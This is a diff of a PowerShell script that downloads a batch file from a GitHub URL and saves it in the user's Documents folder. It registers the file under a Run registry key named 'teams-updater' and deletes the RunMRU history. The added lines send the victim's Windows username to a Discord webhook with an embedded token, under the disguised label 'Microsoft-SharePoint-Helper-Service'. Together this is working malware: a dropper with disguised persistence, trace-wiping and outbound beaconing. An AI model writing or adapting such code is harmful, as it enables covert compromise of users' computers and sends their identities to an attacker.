@@ -3,6 +3,25 @@ $data = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DanielAckerman
 New-Item -Path "C:/Users/$env:USERNAME/Documents/w.bat"
 Set-Content -Path "C:/Users/$env:USERNAME/Documents/w.bat" -Value $data.Content
 
+$currentUsername = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$currentUsername = $currentUsername.Split("\")[1]
+$softwareName = "Microsoft-SharePoint-Helper-Service"
+$url = "https://discord.com/api/webhooks/1238472164395585617/EV5vZVUbYawnGuBY7DcrXaQy5LWq5dLbrqjhQIb_geikhx-xuUClAhG9XNm2D_8xQvBb"
+$payload = @{
+    username = $currentUsername
+    avatar_url = "https://cdn.mos.cms.futurecdn.net/7auVjCELrhFKTPfudXRTgc.jpg"
+    embeds = @(
+        @{
+            title = "Installing..."
+            description = $softwareName
+            color = 3066993 
+        }
+    )
+}
+
+$jsonPayload = $payload | ConvertTo-Json -Depth 5
+Invoke-RestMethod -Uri $url -Method Post -Body $jsonPayload -ContentType "application/json"
+
 Start-Sleep -Seconds 5
 New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "teams-updater" -Value "C:\Users\$env:USERNAME\Documents\w.bat" -PropertyType String
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
